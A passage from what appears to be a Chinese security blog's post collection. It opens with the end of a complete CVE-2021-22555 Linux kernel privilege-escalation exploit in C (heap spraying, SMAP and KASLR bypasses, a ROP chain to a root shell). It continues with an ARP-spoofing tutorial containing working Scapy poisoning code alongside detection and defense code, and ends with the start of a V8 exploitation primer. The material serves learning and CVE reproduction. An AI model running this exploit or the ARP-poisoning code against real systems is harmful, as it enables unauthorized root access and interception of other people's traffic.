 uint64_t pipe_buffer_ops = 0;\n  uint64_t kheap_addr = 0, kbase_addr = 0, kernel_offset = 0;\n\n  int fake_idx = -1, real_idx = -1;\n  saveStatus();\n  printf(\"\\033[32m\\033[1m[+] STAGE 0: Initialization\\033[0m\\n\");\n\n  printf(\"[*] Setting up namespace sandbox...\\n\");\n  if (setup_sandbox() < 0)\n    goto err_no_rmid;\n\n\n  printf(\"[*] Initializing sockets and message queues...\\n\");\n\n  if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {\n    perror(\"[-] socket\");\n    goto err_no_rmid;\n  }\n\n  for (int i = 0; i < NUM_SOCKETS; i++) {\n    if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {\n      perror(\"[-] socketpair\");\n      goto err_no_rmid;\n    }\n  }\n// 1. two bytes null write -> UAF\n// 1-1. gain 4096 msg queue\n  for (int i = 0; i < NUM_MSQIDS; i++) {\n    if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {\n      perror(\"[-] msgget\");\n      goto err_no_rmid;\n    }\n  }\n\n  printf(\"\\n\");\n  printf(\"\\033[32m\\033[1m[+] STAGE 1: Memory corruption\\033[0m\\n\");\n//1-2. create 4096 primary msg —— size=0x1000\n  printf(\"[*] Spraying primary messages...\\n\");\n  for (int i = 0; i < NUM_MSQIDS; i++) {\n    memset(&msg_primary, '\\xdd', 0x100);\n    *(int *)&msg_primary.mtext[0] = MSG_TAG;\n    *(int *)&msg_primary.mtext[4] = i;\n    if (write_msg(msqid[i], &msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) < 0)\n      goto err_rmid;\n  }\n// 1-3. create 4096 secondary msg —— size=0x400\n  printf(\"[*] Spraying secondary messages...\\n\");\n  for (int i = 0; i < NUM_MSQIDS; i++) {\n    memset(&msg_secondary, 0, sizeof(msg_secondary));\n    *(int *)&msg_secondary.mtext[0] = MSG_TAG;\n    *(int *)&msg_secondary.mtext[4] = i;\n    if (write_msg(msqid[i], &msg_secondary, sizeof(msg_secondary),\n                  MTYPE_SECONDARY) < 0)\n      goto err_rmid;\n  }\n// 1-4. release #1024/#2048/#3072 msg\n  printf(\"[*] Creating holes in primary messages...\\n\");\n  for (int i = HOLE_STEP; i < NUM_MSQIDS; i += HOLE_STEP) {\n    if (read_msg(msqid[i], &msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) <\n        0)\n      goto err_rmid;\n  }\n// 1-5. make xt_table_info struct take up the hole, and triger 2 bytes null write\n  printf(\"[*] Triggering out-of-bounds write...\\n\");\n  if (trigger_oob_write(s) < 0)\n    goto err_rmid;\n\n// 1-6. find which msg is corrupted\n  printf(\"[*] Searching for corrupted primary message...\\n\");\n  for (int i = 0; i < NUM_MSQIDS; i++) {\n    if (i != 0 && (i % HOLE_STEP) == 0)\n      continue;\n    if (peek_msg(msqid[i], &msg_secondary, sizeof(msg_secondary), 1) < 0)\n      goto err_no_rmid;\n    if (*(int *)&msg_secondary.mtext[0] != MSG_TAG) {\n      printf(\"[-] Error could not corrupt any primary message.\\n\");\n      goto err_no_rmid;\n    }\n    if (*(int *)&msg_secondary.mtext[4] != i) {\n      fake_idx = i;\n      real_idx = *(int *)&msg_secondary.mtext[4];\n      break;\n    }\n  }\n\n  if (fake_idx == -1 && real_idx == -1) {\n    printf(\"[-] Error could not corrupt any primary message.\\n\");\n    goto err_no_rmid;\n  }\n\n  // fake_idx's primary message has a corrupted next pointer; wrongly pointing to real_idx's secondary message.\n  printf(\"[+] fake_idx: 0x%x\\n\", fake_idx);\n  printf(\"[+] real_idx: 0x%x\\n\", real_idx);\n\n  printf(\"\\n\");\n  printf(\"\\033[32m\\033[1m[+] STAGE 2: SMAP bypass\\033[0m\\n\");\n// 2. leak secondary msg address (kmalloc-0x400) -> to forge `msg_msg->m_list->next & prev`\n// 2-1. free overlapped msg\n  printf(\"[*] Freeing real secondary message...\\n\");\n  if (read_msg(msqid[real_idx], &msg_secondary, sizeof(msg_secondary),\n               MTYPE_SECONDARY) < 0)\n    goto err_rmid;\n\n  // Reclaim the previously freed secondary message with a fake msg_msg of maximum possible size.\n// 2-2. spray and forge msg_msg (forge larger msg_msg->m_ts)\n  printf(\"[*] Spraying fake secondary messages...\\n\");\n  memset(secondary_buf, 0, sizeof(secondary_buf));\n  build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,\n                PAGE_SIZE - MSG_MSG_SIZE, 0);\n  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)\n    goto err_rmid;\n// 2-2. leak heap pointer `msg_msg->m_list->prev` (kmalloc-0x1000)\n  // Use the fake secondary message to read out-of-bounds.\n  printf(\"[*] Leaking adjacent secondary message...\\n\");\n  if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)\n    goto err_rmid;\n\n  // Check if the leak is valid.\n  if (*(int *)&msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) {\n    printf(\"[-] Error could not leak adjacent secondary message.\\n\");\n    goto err_rmid;\n  }\n\n  // The secondary message contains a pointer to the primary message.\n  msg = (struct msg_msg *)&msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];\n  kheap_addr = msg->m_list_next;\n  if (kheap_addr & (PRIMARY_SIZE - 1))\n    kheap_addr = msg->m_list_prev;\n  printf(\"[+] kheap_addr: 0x%\" PRIx64 \"\\n\", kheap_addr);\n\n  if ((kheap_addr & 0xFFFF000000000000) != 0xFFFF000000000000) {\n    printf(\"[-] Error kernel heap address is incorrect.\\n\");\n    goto err_rmid;\n  }\n// 2-3. leak heap pointer `msg_msg->m_list->prev` (kmalloc-0x400)  (forge msg_msg->next)\n  printf(\"[*] Freeing fake secondary messages...\\n\");\n  free_skbuff(ss, secondary_buf, sizeof(secondary_buf));\n\n  // Put kheap_addr at next to leak its content. Assumes zero bytes before\n  // kheap_addr.\n  printf(\"[*] Spraying fake secondary messages...\\n\");\n  memset(secondary_buf, 0, sizeof(secondary_buf));\n  build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,\n                sizeof(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);      // fist 8 bytes must be NULL\n  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)\n    goto err_rmid;\n\n  // Use the fake secondary message to read from kheap_addr.\n  printf(\"[*] Leaking primary message...\\n\");\n  if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)\n    goto err_rmid;\n\n  // Check if the leak is valid.\n  if (*(int *)&msg_fake.mtext[PAGE_SIZE] != MSG_TAG) {\n    printf(\"[-] Error could not leak primary message.\\n\");\n    goto err_rmid;\n  }\n\n  // The primary message contains a pointer to the secondary message.\n  msg = (struct msg_msg *)&msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];\n  kheap_addr = msg->m_list_next;\n  if (kheap_addr & (SECONDARY_SIZE - 1))\n    kheap_addr = msg->m_list_prev;\n\n  // Calculate the address of the fake secondary message.\n  kheap_addr -= SECONDARY_SIZE;\n  printf(\"[+] kheap_addr: 0x%\" PRIx64 \"\\n\", kheap_addr);\n\n  if ((kheap_addr & 0xFFFF00000000FFFF) != 0xFFFF000000000000) {\n    printf(\"[-] Error kernel heap address is incorrect.\\n\");\n    goto err_rmid;\n  }\n// 3. leak kernel base\n  printf(\"\\n\");\n  printf(\"\\033[32m\\033[1m[+] STAGE 3: KASLR bypass\\033[0m\\n\");\n\n  printf(\"[*] Freeing fake secondary messages...\\n\");\n  free_skbuff(ss, secondary_buf, sizeof(secondary_buf));\n\n// 3-1. forge `msg_msg->m_list->next & prev` so that list_del() does not crash.\n  printf(\"[*] Spraying fake secondary messages...\\n\");\n  memset(secondary_buf, 0, sizeof(secondary_buf));\n  build_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr, 0, 0);\n  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)\n    goto err_rmid;\n// 3-2. free secondary msg\n  printf(\"[*] Freeing sk_buff data buffer...\\n\");\n  if (read_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), MTYPE_FAKE) < 0)\n    goto err_rmid;\n// 3-3. spray pipe_buffer object\n  printf(\"[*] Spraying pipe_buffer objects...\\n\");\n  for (int i = 0; i < NUM_PIPEFDS; i++) {\n    if (pipe(pipefd[i]) < 0) {\n      perror(\"[-] pipe\");\n      goto err_rmid;\n    }\n    // Write something to populate pipe_buffer.\n    if (write(pipefd[i][1], \"pwn\", 3) < 0) {\n      perror(\"[-] write\");\n      goto err_rmid;\n    }\n  }\n// 3-4. leak pipe_buffer->ops —— kernel base\n  printf(\"[*] Leaking and freeing pipe_buffer object...\\n\");\n  for (int i = 0; i < NUM_SOCKETS; i++) {\n    for (int j = 0; j < NUM_SKBUFFS; j++) {\n      if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) < 0) {\n        perror(\"[-] read\");\n        goto err_rmid;\n      }\n      if (*(uint64_t *)&secondary_buf[0x10] != MTYPE_FAKE)\n        pipe_buffer_ops = *(uint64_t *)&secondary_buf[0x10];\n    }\n  }\n  kernel_offset = pipe_buffer_ops - ANON_PIPE_BUF_OPS;\n  kbase_addr = 0xffffffff81000000 + kernel_offset;\n  printf(\"[+] anon_pipe_buf_ops: 0x%\" PRIx64 \"\\n\", pipe_buffer_ops);\n  printf(\"[+] kbase_addr: 0x%\" PRIx64 \"\\n\", kbase_addr);\n\n  if ((kbase_addr & 0xFFFF0000000FFFFF) != 0xFFFF000000000000) {\n    printf(\"[-] Error kernel base address is incorrect.\\n\");\n    goto err_rmid;\n  }\n// 4. hijack control-flow\n  printf(\"\\n\");\n  printf(\"\\033[32m\\033[1m[+] STAGE 4: Kernel code execution\\033[0m\\n\");\n// 4-1. use skb to forge fake pipe_buffer\n  printf(\"[*] Spraying fake pipe_buffer objects...\\n\");\n  memset(secondary_buf, 0, sizeof(secondary_buf));\n\n  //hijack rsp\n  fake_pipe_buffer = (struct pipe_buffer *)&secondary_buf;\n  fake_pipe_buffer->ops = kheap_addr;\n  \n  fake_pipe_buffer_ops = (struct pipe_buf_operations *)secondary_buf;\n  fake_pipe_buffer_ops->release = kernel_offset + PUSH_RSI_JMP_RSI_0x2E;                  //\n  fake_pipe_buffer_ops->confirm = kernel_offset + ADD_RSP_0x98_RET;\n\n  uint64_t *mid_gadget;\n  mid_gadget = (uint64_t*) (uint64_t*) &secondary_buf[0x2e];\n  mid_gadget[0] = kernel_offset + POP_RSP_RET;\n\n// 4-2. construct ROP chain\n  //build rop\n    int rop_idx = 0;\n    rop_chain = (uint64_t*) &secondary_buf[0xa0];\n    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;\n    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;\n    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;\n    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22;\n    rop_chain[rop_idx++] = *(uint64_t*) \"PIG007XX\";\n    rop_chain[rop_idx++] = *(uint64_t*) \"PIG007XX\";\n    rop_chain[rop_idx++] = getRootShell;\n    rop_chain[rop_idx++] = user_cs;\n    rop_chain[rop_idx++] = user_eflags;\n    rop_chain[rop_idx++] = user_sp;\n    rop_chain[rop_idx++] = user_ss;\n\n\n  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)\n    goto err_rmid;\n// 4-3. trigger pipe_release()\n  printf(\"[*] Releasing pipe_buffer objects...\\n\");\n  printf(\"\\n\");\n  for (int i = 0; i < NUM_PIPEFDS; i++) {\n    if (close(pipefd[i][0]) < 0) {\n      perror(\"[-] close\");\n      goto err_rmid;\n    }\n    if (close(pipefd[i][1]) < 0) {\n      perror(\"[-] close\");\n      goto err_rmid;\n    }\n  }\n  return 0;\n\nerr_rmid:\n  for (int i = 0; i < NUM_MSQIDS; i++) {\n    if (i == fake_idx)\n      continue;\n    if (msgctl(msqid[i], IPC_RMID, NULL) < 0)\n      perror(\"[-] msgctl\");\n  }\n\nerr_no_rmid:\n  return 1;\n}\n```\n\n效果：\n\n中间有个`getchar()`，按下回车即可，本来放这是为了方便调试的。\n\n![image-20220515143144038](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220515143144038.png)\n\n不行的话可以多尝试几次\n\n然后逃逸容器的我没尝试，也不太会，可以参考[arttnba3师傅的容器逃逸EXP](https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#FINAL-EXPLOIT)\n\n# 参考\n\n[CVE-2021-22555 2字节堆溢出写0漏洞提权分析 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/254027)\n\n[【CVE.0x07】CVE-2021-22555 漏洞复现及简要分析 - arttnba3's blog](https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT)\n\n[CVE-2021-22555: Turning \\x00\\x00 into 10000$ | security-research (google.github.io)](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html)\n\n太多了，有点贴不过来了....\n","tags":["Kernel_CVE"],"categories":["Kernel_CVE"]},{"title":"arp_spoof","url":"/2022/03/07/arp_spoof/","content":"\n# 一、原理\n\n## 1.攻击\n\n### (1)欺骗受害者\n\n向受害者发包，欺骗受害者本机为网关，使得受害者的ARP表中本机的MAC地址为网关的MAC地址。\n\n```python\ndef build_rep(target_ip, gateway_ip):\n    global self_mac\n    target_mac = getmacbyip(target_ip)\n    #print(gateway_ip)\n    if target_ip is None:\n        print(\"[-] Error: Could not resolve targets MAC address\")\n        sys.exit(1)\n    # Ether对应包的src和dst   ARP只会修改其中的ARP包，告诉dst，这个包的mac是hwsrc，ip是psrc，发给hwdst/pdst\n    pkt = Ether(src=self_mac, dst=target_mac) / ARP(hwsrc=self_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip,\n                                                    op=2)\n        # 本机mac 受欺骗的主机mac 本机mac 网关的ip地址 被攻击人的mac 被攻击人的ip OP值是表示请求还是回应 1：请求  2：回应\n        # 那么这种模式下即本机发往受害者，告诉受害者网关(psrc)的mac地址是本机(self_mac)，下回依据IP查ARP表就会把应该发给网关的包通过mac发包发给本机\n    return pkt\n```\n\n### (2)欺骗网关\n\n向网关发包，欺骗网关受害者为本机，使得网关的ARP表中受害者的MAC地址为本机的MAC地址\n\n```python\ndef build_req(target_ip, gateway_ip):\n    global self_mac\n    target_mac = getmacbyip(target_ip)\n    gateway_mac = getmacbyip(gateway_ip)\n    if target_mac is None:\n        print(\"[-] Error: Could not resolve targets MAC address\")\n        sys.exit(1)\n\n    #Ether对应包的src和dst   ARP只会修改其中的ARP包，告诉dst，这个包的mac是hwsrc，ip是psrc，发给hwdst/pdst\n    pkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,\n                                                  op=1)\n    # 本机mac 网关mac 本机mac 受欺骗的主机mac 网关mac 网关的ip地址 OP值是表示请求还是回应 1：请求  2：回应\n    # 那么这种模式下即本机发往网关，告诉网关受害者(psrc)的mac地址是本机(self_mac)，下回依据IP查ARP表就会把应该发给受害者的包通过mac发包发给本机\n    return pkt\n```\n\n### (3)欺骗所有人\n\n向广播地址发包，使得所有人的ARP都被修改，从而欺骗所有人，这个没有实现，感觉动静太大，没啥用\n\n\n\n## 2.防御\n\n### (1)检测\n\n#### ①rep模式\n\n这种模式本机的arp表中的MAC地址会改变，linux下由于输入arp加载比较慢，估计后台会进行ping，所以使用`ip neigh`来获取，从中找到是否存在相同的MAC地址，从而判断是否被该模式攻击，即转化为set看长度是否相同\n\n```python\n#detect_rep\nif(len(ip_mac_dictionary) != len(set(ip_mac_dictionary.values()))):\n    print(\"rep_get\")\n    rep_detect_flag = True\n```\n\n#### ②req模式\n\n这种模式下我们可以尝试arping网关，如果MAC地址没被修改，而arping网关不能通，那么就是网关被欺骗，依据此来进行检测\n\n```python\n#detect_req\ngateway_mac = getmacbyip(gateway_ip)\np = subprocess.Popen([\"arping\",\"-i\",netD_name,\"-c\",\"1\",gateway_mac], stdout=subprocess.PIPE)\nfor line in p.stdout.readlines():\n    line_splitby_space = line.decode(\"utf-8\").strip().split(\" \")\n    if(\"Timeout\" in line_splitby_space):\n        req_detect_flag = True\n        break\n```\n\n### (2)实际防御\n\n#### ①rep模式\n\n直接将网关真实的MAC地址和对应IP进行静态绑定即可。获取网关真实MAC地址，可以使用getmacbyip函数，该函数会向局域网内广播，询问网关真实的MAC的地址，而攻击者那里肯定存在真实的MAC地址，所以基本一定能获得到真实的IP地址\n\n![image-20220307120520964](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071205089.png)\n\n```python\nif(rep_detect_flag):\n    self.ui.defenseInfoText.appendPlainText(\"Defending against arp_rep attacks......\")\n    build_rep_defense()\n    p = subprocess.Popen([\"ip\", \"neigh\"], stdout=subprocess.PIPE)\n    for line in p.stdout.readlines():\n        line_splitby_space = line.decode(\"utf-8\").strip().split(\" \")\n        if (\"FAILED\" not in line_splitby_space):\n            self.ui.defenseInfoText.appendPlainText('{:<30s}'.format(line_splitby_space[0]) + \"\\t\" + line_splitby_space[4])\n```\n\n这里我直接修改所有的的IP_MAC为静态的\n\n#### ②req模式\n\n由于是网关被欺骗了，所以我们也可以向网关发包，使其将我的IP和MAC真实写入ARP欺骗，但是攻击者可能会一直发包，所以我们也需要一直发包才能断续防御攻击，不过还是可能会丢不少包。\n\n```python\ndef build_req_defense():\n    global gateway_ip\n    global self_mac\n    self_ip = get_self_ip()\n    #self_mac = get_if_hwaddr(netD_name)\n    gateway_mac = getmacbyip(gateway_ip)\n    #Ether对应包的src和dst   ARP只会修改其中的ARP包，告诉dst，这个包的mac是hwsrc，ip是psrc，发给hwdst/pdst\n    pkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=self_ip, hwdst=gateway_mac, pdst = gateway_ip,op=1)\n    return pkt\n```\n\n如上设置包内容，告诉网关我才是真的。\n\n或者有网关权限的，直接在网关的shell进行静态绑定。\n\n\n\n# 二、pyQt界面\n\n## 1.环境搭建\n\n主要配合pycharm，先安装pyQt5，然后在对应的包里即可打开\n\n```bash\npip3 install PyQt5\n/home/hacker/.local/lib/python3.6/site-packages/qt5_applications/Qt/bin/designer\n```\n\n## 2.配合pycharm\n\n主要设置一下即可\n\nFile->setting->Tools->External Tools->+一下工具\n\n### Qt_Designer\n\n![image-20220307112101403](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071121488.png)\n\n直接点击即可加载\n\n![image-20220307112540614](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071125687.png)\n\n\n\n### UI转py\n\n转完之后会比较舒服，因为在pycharm中可以提示相关的控件，但是直接load加载ui文件的话就没有提示。\n\n![image-20220307112150183](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071121263.png)\n\nArguments的命令参数为：\n\n```\n-m PyQt5.uic.pyuic $FileName$ -o $FileNameWithoutExtension$.py\n```\n\n目前好像py->ui没办法转回去\n\n之后点击要转换的ui文件，然后对应的打开工具即可在当前文件夹下生成py文件\n\n![image-20220307112701929](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071127006.png)\n\n对应就会生成`window.py`文件\n\n## 3.界面启动\n\n```python\nclass MainWindow(QMainWindow):\n    def __init__(self):\n        super().__init__()\n        #导入ui\n        self.ui = Ui_MainWindow()\n        \nif __name__ == '__main__':\n    app = QApplication([])\n    myWindow = MainWindow()\n    myWindow.show()\n    sys.exit(app.exec_())\n```\n\n## 4.界面退出\n\n一般界面都是多线程的，所以退出的时候一般需要加上一些东西将一些线程给关闭，安全退出，所以需要重写一下窗口关闭的closeEvent函数\n\n```python\ndef closeEvent(self, event):\n    for key in threads_flag_dictionary.keys():\n        threads_flag_dictionary[key].set()#相关线程终止flag设置\n    event.accept()\n    os._exit(0)\n```\n\n\n\n# 三、利用函数详解\n\n## 1.发包函数\n\n### (1)Ether\n\n主要就是使用Ether创建一个MAC数据帧头，即源MAC地址，要发往的MAC地址，这个不能更改，用来在局域网中设置发往的地方。\n\n```python\nEther(src=self_mac, dst=gateway_mac)\n```\n\n### (2)ARP\n\n这个就是用来伪造数据包中的ARP数据，可以随便改，目标主机接收到该数据包的时候，会判断是否和本机的ARP表是否相同，不同则会依据该ARP包来进行修改。\n\n```python\nARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,op=1)\n```\n\nARP欺骗主要就是修改`hwsrc/psrc`，使得目标主机的ARP表依据该`hwsrc/psrc`来对自己的ARP表进行写入。比如这里就是使得目标主机中的ARP表由原本正确的`target_ip---target_MAC`变为`target_ip---self_mac`\n\n### (3)实际发包\n\n需要将Ether和ARP结合起来组成一个MAC帧pkt，然后就可以将该MAC帧发往网卡`network driver`\n\n```python\npkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,op=1)\n```\n\n#### ①send\n\n工作在第三层网络层，发送IP数据包，包头需要是IP数据包头\n\n```python\nsend(IP(dst=\"192.168.1.107\")/ICMP())\n```\n\n#### ②sendp\n\n工作在第二层链路层，发送MAC帧，包头需要是MAC帧头，即Ether\n\n```python\nsendp(pkt, inter=2, iface=netD_name)\n#这里pkt就是包，即Ether()/ARP()之类的\n```\n\n## 2.线程函数\n\n使用pyQt线程函数，一般两种方法，比较喜欢用threading的\n\n### (1)线程启动\n\n```python\n#设置终止信号，防止线程一直运行不停止\nsend_thread_defense_stop_flag = threading.Event()\n#线程创建，对应self.send_pack函数，参数为args=(xxx,xxx,xxx)\nsend_thread = threading.Thread(target=self.send_pack, args=(pkt,send_thread_defense_stop_flag,\"defense\"))\n#线程启动\nsend_thread.start()\n#将终止信号添加进字典进行管理\nthreads_flag_dictionary['send_defense_thread'] = send_thread_defense_stop_flag\n```\n\n### (2)线程阻塞\n\n有时候需要线程阻塞，即完成该线程才进行下一步，那么就需要用到join函数\n\n```python\n#用在send_thread.start()之后\nsend_thread.join()\n```\n\n### (3)线程终止\n\n即之前提到的设置对应的终止flag\n\n```python\n#触发停止信号\nthreads_flag_dictionary['send_defense_thread'].set()\n\n#send_pack函数中某些需要一直运行的代码块中\nwhile (stop_flag.is_set()):\n\tpass\n```\n\n## 3.其他功能性函数\n\n### (1)获取存活主机函数\n\n由于`ip neigh`命令会从一个存活主机的缓冲区中获取相关的主机，但是实际上如果新加入一个主机，则不会显示出来，除非接收到该主机的包，所以我们需要主动去ping他们，看他们是否存活。\n\n```python\nip_prefix = '.'.join(gateway_ip.split('.')[:-1])\nthreads = []\nfor i in range(1, 256):\n    ip = '%s.%s' % (ip_prefix, i)\n    threads.append(threading.Thread(target=ping_ip, args={ip, }))\nfor i in threads:\n    i.start()\nfor i in threads:\n    i.join()\n\ndef ping_ip(ip_str):\n    cmd = [\"ping\", \"-c\",\"1\", ip_str]\n    output = os.popen(\" \".join(cmd)).readlines()\n    for line in output:\n        if str(line).upper().find(\"TTL\") >= 0:\n            print(\"ip: %s 在线\" % ip_str)\n```\n\n### (2)获取本IP\n\n```python\ndef get_self_ip():\n    global netD_name\n    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', bytes(netD_name[:15],'utf-8')))[20:24])\nself_ip = get_self_ip()\n```\n\n### (3)从stdout获取输出\n\n```python\ndef get_conten_from_stdout(self,func):\n    sys.stdout = string_io = StringIO()\n    func()\n    sys.stdout = self._stdout\n    print_str = string_io.getvalue()\n    del string_io\n    return print_str\n\nprint_str = self.get_conten_from_stdout(pkt.show)\n```\n\n","tags":["arp_spoof"],"categories":["arp_spoof"]},{"title":"V8从0开始","url":"/2022/03/01/V8从0开始/","content":"\n\n\n# 一、环境搭建\n\n参照[[原创\\]v8利用初探 2019 StarCTF oob 复现分析-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com](https://bbs.pediy.com/thread-268933.htm#msg_header_h1_5)\n\n## 1.代理设置\n\n```bash\ngit config --global http.proxy http://ip:port\nexport {http,https}_proxy=\"http://ip:port\"\n```\n\n## 2.代码下载\n\n```bash\ngit clone https://chromium.googlesource.com/chromium/tools/depot_tools.git\necho \"export PATH=/pathto/depot_tools:$PATH\" >> ~/.bashrc\n#获取v8源码\nfetch v8\n#切换题目对应版本的commit\ngit checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598\n# 工具同步\ngclient sync\n#应用题目的补丁文件\n#一般而言出题都是人为给某个版本的v8加一个洞上去，所以用题目给的diff文件给引擎加洞\ngit apply ../oob.diff\n\n#有的老版本最好还是用python2来编译，不然语法可能会出错\n# 编译release版本\n#测试exp用release版本，用debug版本测试通常会出错\n./tools/dev/v8gen.py x64.release\nninja -C ./out.gn/x64.release\n\n# 编译debug版本\n#调试用debug版本\n./tools/dev/v8gen.py x64.debug\nninja -C ./out.gn/x64.debug\n```\n\n\n\n\n\n# 二、前置知识\n\n参考：[从一道CTF题零基础学V8漏洞利用 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/203721.html)\n\n## 1.调试知识\n\n需要注意的是debug版本的用来辅助显示，直接是没办法运行相关代码的，realse用来实际运行。\n\n### (1)工具\n\n常见的pwndbg，可以搭配如下的小工具\n\n源码的`/pathto/v8/tools`目录下有专门用来调试v8的gdbinit，加在`~/.gdbinit`中即可\n\n```\nsource /pathto/v8/tools/gdbinit\n```\n\n### (2)函数\n\n在运行./d8时加入`--allow-natives-syntax`选项，可以使用一些调试函数\n\n```bash\n./d8 --allow-natives-syntax\n#或者配合gdb\ngdb ./d8\nset args --allow-natives-syntax ./test.js\nr\n```\n\n如下函数\n\n```javascript\n%DebugPrint(obj) //输出对象地址\n%SystemBreak() //触发调试中断主要结合gdb等调试器使用，类似于python中的dbg()断点\n```\n\n示例代码如下：\n\n```js\nvar a = [1,2,3];\nvar b = [1.1, 2.2, 3.3];\nvar c = [a, b];\n%DebugPrint(a);\n%SystemBreak();  //触发第一次调试\n%DebugPrint(b);\n%SystemBreak();  //触发第二次调试\n%DebugPrint(c);\n%SystemBreak();  //触发第三次调试\n```\n\n\n\n## 2.基础知识\n\n### (1)对象内存讲解\n\n```js\nvar a = [1,2,3];\n```\n\n比如如下定义数组对象a，那么运行`%DebugPrint(a);`得到地址后，使用job命令可以看到如下的内存布局\n\n![image-20220301220834343](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012217111.png)\n\nv8在内存中只有数字和对象两种表示。为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。因此上图该对象的实际内存地址应该为(0x346b7364dde9-1=**0x346b7364dde8**)\n\n而对于数组对象则大致如下布局\n\n|    map     | 表明了一个对象的类型对象，上图即为PACKED_SMI_ELEMENTS |\n| :--------: | :---------------------------------------------------: |\n| prototype  |                       prototype                       |\n|  elements  |                       对象元素                        |\n|   length   |                       元素个数                        |\n| properties |                         属性                          |\n\n而对于其中的elements元素也是一个对象，且地址位于对象a的上方，能看到里面的内容，也就是说先申请的elements这个元素内存，然后再申请的数组对象a\n\n![image-20220301222151967](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012221043.png)\n\n那么总的内存布局如下\n\n```\nelements     ----> +------------------------+\n                   |          MAP           +<---------+\n                   +------------------------+          |\n                   |      element 1         |          |\n                   +------------------------+          |\n                   |      element 2         |          |\n                   |      ......            |          |\n                   |      element n         |          |\n                   +------------------------+          |\n                   |      .........         |          |\n ArrayObject  ---->-------------------------+          |\n                   |      map               |          |\n                   +------------------------+          |\n                   |      prototype         |          |\n                   +------------------------+          |\n                   |      elements          |+--------+|\n                   +------------------------+\n                   |      length            |\n                   +------------------------+\n                   |      properties        |\n                   +------------------------+\n```\n\n其他类型的对象都有些类似，可以自己去尝试看看\n\n其中也不一定元素后面就跟的是`ArrayObject`的内容，也可能中间间隔了很多东西，比如如下情形，`elements`的地址和`ArrayObject`的地址差的还是挺大的，可能是内存分配上的一些问题吧?不太懂v8的内存分配是怎么实现的。\n\n![image-20220318205130634](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203182051776.png)\n\n### (2)不同对象类型内存分布\n\n#### ①数组对象\n\n```js\nvar array = [1.1,2.2,3.3];\n```\n\n如下内存布局\n\n```\nelements     ----> +------------------------+<---------+\n                   |          MAP           +\t\t   |\n                   +------------------------+          |\n                   |      element 1         |          |\n                   +------------------------+          |\n                   |      element 2         |          |\n                   |      ......            |          |\n                   |      element n         |          |\n                   +------------------------+          |\n                   |      .........         |          |\n ArrayObject  ---->-------------------------+          |\n                   |      map               |          |\n                   +------------------------+          |\n                   |      prototype         |          |\n                   +------------------------+          |\n                   |      elements          |+--------+|\n                   +------------------------+\n                   |      length            |\n                   +------------------------+\n                   |      properties        |\n                   +------------------------+\n```\n\ndouble或者float的数组也相似，就是map的类型为`PACKED_DOUBLE_ELEMENTS`\n\n#### ②对象数组对象\n\n```js\nvar objectArray = [a, b];//a,b为对象\n```\n\n即数组里存放的是对象，也是类似的，就是在elements中会有点不一样，相当于存放一个指针指向包含的对象，包括map的类型也不同，为`PACKED_ELEMENTS`\n\n![image-20220301223028101](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012230225.png)\n\n```\nelementA     ----> +------------------------+<---------+\n                   |         MAP            +\t\t   |\n                   +------------------------+          |\n                   |       Length           +\t\t   |\n                   +------------------------+          |\n                   |      element 1         |          |\n                   +------------------------+          |\n                   |      element 2         |          |\n                   |      ......            |          |\n                   |      element n         |          |\n                   +------------------------+          |\n                   |      .........         |          |\nelementB     ----> +------------------------+<---------+\n                   |         MAP            +\t\t   |\n                   +------------------------+          |\n                   |   